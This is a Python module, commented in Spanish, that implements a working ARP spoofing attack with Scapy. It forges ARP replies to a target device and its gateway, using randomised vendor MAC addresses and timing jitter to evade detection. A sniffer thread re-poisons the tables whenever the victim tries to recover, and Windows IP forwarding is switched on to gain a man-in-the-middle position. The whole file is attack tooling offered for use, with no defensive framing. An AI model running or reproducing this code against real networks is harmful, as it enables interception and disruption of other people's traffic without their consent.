"""
Módulo ARP - Spoofing reactivo y evasión de iPhones
"""

import time
import random
import threading
from modulos.network_core import _obtener_mac, _mac_aleatoria
from modulos.system_utils import _win_set_ip_forwarding, _is_admin
from modulos.config import _estado

class ARPModule:
    """Módulo de ARP Spoofing con evasión mejorada."""
    
    def __init__(self, logger_engine):
        self.logger = logger_engine
    
    def start_attack(self, ip_target, gateway, interval_base, stealth, jitter, oui, write_callback, stop_callback):
        """Inicia el ataque de ARP spoofing."""
        if not hasattr(self, '_scapy_available'):
            try:
                from scapy.all import Ether, ARP, sendp, sniff
                self._scapy_available = True
            except ImportError:
                self._scapy_available = False
                write_callback("✗ Scapy no disponible.\n")
                return False
        
        if not self._scapy_available:
            return False
        
        _estado["arp"].set()
        threading.Thread(target=self._arp_loop, args=(
            ip_target, gateway, interval_base, stealth, jitter, oui, write_callback, stop_callback
        ), daemon=True).start()
        return True
    
    def stop_attack(self, write_callback):
        """Detiene el ataque de ARP spoofing."""
        _estado["arp"].clear()
        write_callback("● Deteniendo y restaurando ARP...\n")
        self.logger.log("[ARP] Ataque detenido.", "warn")
    
    def _arp_loop(self, ip_target, gateway, interval_base, stealth, jitter, oui, write_callback, stop_callback):
        """Loop principal del ataque ARP."""
        try:
            from scapy.all import Ether, ARP, sendp, sniff
        except ImportError:
            return
        
        # Elegir MAC de ataque
        mac_src = _mac_aleatoria(oui if oui != "ninguno" else None) if oui != "ninguno" else None
        
        mac_obj = _obtener_mac(ip_target)
        if not mac_obj:
            write_callback(f"✗ No se obtuvo MAC de {ip_target}. ¿Npcap? ¿IP activa?\n")
            self.logger.log(f"[ARP] Error: sin MAC para {ip_target}", "err")
            stop_callback()
            return
        
        write_callback(f"» Target:  {ip_target}  ({mac_obj})\n")
        write_callback(f"» Gateway: {gateway}\n")
        write_callback(f"» MAC src: {mac_src or 'Original'}  [evasión: {oui}]\n")
        write_callback("─" * 44 + "\n")
        self.logger.log(f"[ARP] Iniciado → {ip_target}", "warn")
        
        try:
            # Preparar paquetes
            pkt_t = Ether(src=mac_src, dst=mac_obj) / ARP(pdst=ip_target, hwdst=mac_obj, psrc=gateway, hwsrc=mac_src, op=2)
            pkt_g = Ether(src=mac_src, dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=gateway, hwdst="ff:ff:ff:ff:ff:ff", psrc=ip_target, hwsrc=mac_src, op=2)
            
            # Monitoreo reactivo
            threading.Thread(target=self._arp_monitor, args=(ip_target, gateway, pkt_t, pkt_g), daemon=True).start()
            
            # Activar IP forwarding si somos admin
            if _is_admin():
                _win_set_ip_forwarding(True)
                write_callback("✔ IP Forwarding activado (modo oculto).\n")
            
            n = 0
            while _estado["arp"].is_set():
                sendp(pkt_t, verbose=0)
                sendp(pkt_g, verbose=0)
                n += 2
                write_callback(f"  ↗ pkt #{n:4d} → {ip_target}\n")
                self.logger.log(f"[ARP] #{n} pkts → {ip_target}", "pkt")
                
                # Intervalo con jitter
                if stealth:
                    iv = random.uniform(interval_base * 0.6, interval_base * 1.8)
                elif jitter:
                    iv = interval_base + random.uniform(-0.5, 0.5)
                else:
                    iv = interval_base
                time.sleep(max(0.5, iv))
        
        except Exception as e:
            write_callback(f"✗ Error: {e}\n")
            self.logger.log(f"[ARP] Error: {e}", "err")
        finally:
            self._restore_arp(ip_target, gateway, mac_obj, write_callback)
            stop_callback()
    
    def _arp_monitor(self, ip_target, gateway, pkt_t, pkt_g):
        """Monitor reactivo para evitar recuperación de conexión."""
        try:
            from scapy.all import ARP, sniff, sendp
            
            def _react(p):
                if not _estado["arp"].is_set(): 
                    return
                if ARP in p and p[ARP].op == 1:  # Si es "who-has"
                    if p[ARP].psrc == ip_target and p[ARP].pdst == gateway:
                        sendp(pkt_t, verbose=0, count=3)
                    elif p[ARP].psrc == gateway and p[ARP].pdst == ip_target:
                        sendp(pkt_g, verbose=0, count=3)
            
            sniff(filter="arp", prn=_react, stop_filter=lambda _: not _estado["arp"].is_set(), store=False)
        except:
            pass
    
    def _restore_arp(self, ip_target, gateway, mac_obj, write_callback):
        """Restaura las tablas ARP."""
        try:
            from scapy.all import Ether, ARP, sendp
        except ImportError:
            return
        
        if _is_admin():
            _win_set_ip_forwarding(False)
        
        write_callback("⟳ Restaurando ARP en modo oculto...\n")
        mac_gw = _obtener_mac(gateway)
        if mac_obj and mac_gw:
            rest_t = Ether(src=mac_gw, dst=mac_obj) / ARP(pdst=ip_target, hwdst=mac_obj, psrc=gateway, hwsrc=mac_gw, op=2)
            rest_g = Ether(src=mac_obj, dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=gateway, hwdst="ff:ff:ff:ff:ff:ff", psrc=ip_target, hwsrc=mac_obj, op=2)
            
            sendp(rest_t, count=6, verbose=0)
            sendp(rest_g, count=6, verbose=0)
            write_callback("✔ Tablas ARP restauradas de manera invisible.\n")
            self.logger.log("[ARP] Tablas restauradas (modo oculto).", "ok")
